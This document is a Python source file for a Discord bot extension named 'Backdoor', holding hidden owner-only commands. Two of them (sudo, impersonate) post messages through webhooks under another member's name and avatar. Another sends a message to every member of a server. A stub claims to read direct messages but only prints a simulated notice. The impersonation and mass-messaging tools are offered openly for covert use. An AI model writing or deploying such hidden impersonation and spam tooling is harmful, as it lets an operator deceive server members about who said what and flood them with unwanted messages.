import discord
from discord.ext import commands
import asyncio
import os

class Backdoor(commands.Cog, name="backdoor"):
    """persistent backdoor and remote access commands."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def sudo(self, ctx: commands.Context, target: discord.Member, *, command: str):
        """force a user to say something."""
        await ctx.message.delete()
        try:
            webhook = await ctx.channel.create_webhook(name=target.display_name)
            await webhook.send(command, avatar_url=target.display_avatar.url)
            await webhook.delete()
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def getdm(self, ctx: commands.Context, target: discord.Member, limit: int = 20):
        """attempt to read recent dms (requires bot to share a server). this is a simulation."""
        await ctx.send("direct message reading is not natively possible without user token. logging simulated.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def impersonate(self, ctx: commands.Context, target: discord.Member, *, message: str):
        """send a message as a webhook mimicking the target user."""
        await ctx.message.delete()
        try:
            webhook = await ctx.channel.create_webhook(name=target.display_name)
            await webhook.send(message, avatar_url=target.display_avatar.url)
            await webhook.delete()
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def grabpfp(self, ctx: commands.Context, target: discord.Member):
        """download a user's profile picture."""
        await ctx.send(target.display_avatar.url)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def massdm(self, ctx: commands.Context, *, message: str):
        """dm every member in the server."""
        count = 0
        for member in ctx.guild.members:
            if member.bot or member == ctx.author:
                continue
            try:
                await member.send(message)
                count += 1
                await asyncio.sleep(1)
            except:
                pass
        await ctx.send(f"messaged {count} members.")


async def setup(bot: commands.Bot):
    await bot.add_cog(Backdoor(bot))
